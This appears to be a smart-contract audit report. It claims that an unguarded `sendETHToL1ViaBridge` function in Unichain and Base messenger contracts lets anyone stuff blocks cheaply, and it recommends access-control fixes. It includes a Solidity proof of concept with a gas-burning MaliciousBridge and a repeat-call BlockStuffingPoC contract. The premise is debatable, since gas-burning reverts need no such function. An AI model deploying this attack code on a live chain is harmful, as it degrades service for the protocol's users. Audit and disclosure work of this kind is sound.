Audit Report

## Title
Unguarded `sendETHToL1ViaBridge` with Arbitrary `l2bridge` Enables Block Stuffing at Near-Zero Cost — (`contracts/bridges/UnichainMessenger.sol`)

## Summary

`UnichainMessenger.sendETHToL1ViaBridge` and `BaseMessenger.sendETHToL1ViaBridge` are declared `external payable nonReentrant` with no caller access control and accept an arbitrary, unvalidated `l2bridge` address. An attacker can supply a malicious contract that burns near-maximum gas and then reverts. Because there is no `try/catch` around the `bridgeETHTo` call, the revert propagates up and rolls back the entire transaction — including the ETH transfer — so the attacker recovers their ETH and pays only gas fees. On Unichain's cheap L2 gas environment, this enables sustained block stuffing at negligible cost.

## Finding Description

`UnichainMessenger.sendETHToL1ViaBridge` (line 24) is `external payable nonReentrant` with no role check or caller whitelist:

```solidity
// contracts/bridges/UnichainMessenger.sol L24-27
function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

The `l2bridge` parameter is cast directly to `IUnichainMessenger` and called with the full ETH value and no address validation. There is no `try/catch`, so any revert inside the malicious `l2bridge.bridgeETHTo` propagates up and reverts the entire transaction, returning the attacker's ETH. The `DEFAULT_GAS_LIMIT = 200_000` constant is passed as a *parameter* to the bridge function, not as an EVM gas stipend; the actual gas available to the callee is bounded only by the 63/64 forwarding rule, allowing a malicious contract to burn ~190,000–200,000 gas before reverting.

The legitimate caller, `RSETHPoolNoWrapper.bridgeAssetsViaNativeBridge` (line 431), enforces `onlyRole(BRIDGER_ROLE)` on its own side, but this restriction does not propagate to the messenger itself, leaving the messenger callable by anyone. The identical pattern exists in `BaseMessenger.sendETHToL1ViaBridge` (line 23–26).

**Exploit path:**
1. Attacker deploys `MaliciousBridge` with a `bridgeETHTo` that spins in a loop until `gasleft() < 10_000` then calls `revert`.
2. Attacker calls `UnichainMessenger.sendETHToL1ViaBridge{value: 1}(address(maliciousBridge), attacker, 1)`.
3. `MaliciousBridge.bridgeETHTo` burns ~190,000 gas and reverts.
4. Revert propagates; entire transaction reverts; attacker's 1 wei is returned.
5. Attacker pays only the L2 gas fee (fractions of a cent on Unichain).
6. Repeat in a loop within one block to consume the 30 M gas limit (~150 calls).

## Impact Explanation

**Low — Block stuffing.** On Unichain (OP Stack), blocks are produced every ~2 seconds with a 30 M gas limit. Each malicious call consumes ~200,000 gas and costs only the L2 gas fee. The attacker recovers all ETH on every revert, so the sustained cost is purely gas fees. This can delay or prevent legitimate bridge operations, user deposits, and protocol transactions from being included in blocks.

## Likelihood Explanation

**Medium.** The function is publicly callable with no preconditions beyond supplying `msg.value == value`. Deploying a gas-burning reverting contract is trivial. The attack is repeatable indefinitely, requires no privileged access, no front-running, and no protocol state setup.

## Recommendation

Add a caller access control modifier to `sendETHToL1ViaBridge` in all messenger contracts (`UnichainMessenger`, `BaseMessenger`, `ArbitrumMessenger`, `ScrollMessenger`), restricting calls to the authorized pool contract(s). Additionally, validate that `l2bridge` matches a protocol-configured address rather than accepting arbitrary input:

```solidity
address public immutable authorizedPool;

modifier onlyAuthorizedPool() {
    require(msg.sender == authorizedPool, "Unauthorized");
    _;
}

function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value)
    external payable nonReentrant onlyAuthorizedPool {
    require(l2bridge == trustedBridge, "Invalid bridge");
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

contract MaliciousBridge {
    function bridgeETHTo(address, uint32, bytes memory) external payable {
        uint256 i;
        while (gasleft() > 10_000) { unchecked { ++i; } }
        revert("burn");
    }
}

contract BlockStuffingPoC {
    UnichainMessenger messenger;
    MaliciousBridge  bridge;

    constructor(address _messenger) payable {
        messenger = UnichainMessenger(_messenger);
        bridge    = new MaliciousBridge();
    }

    // Call repeatedly; each call consumes ~200k gas, ETH is refunded
    function stuff() external payable {
        try messenger.sendETHToL1ViaBridge{value: 1}(address(bridge), address(this), 1) {}
        catch {}
    }
}
```

**Foundry fork test plan:** Deploy on a local Unichain fork. In a single test transaction, call `stuff()` ~150 times in a loop. Assert that `block.gasUsed` approaches the 30 M gas limit while the attacker's ETH balance decreases only by gas fees (not by the 1 wei sent per call).
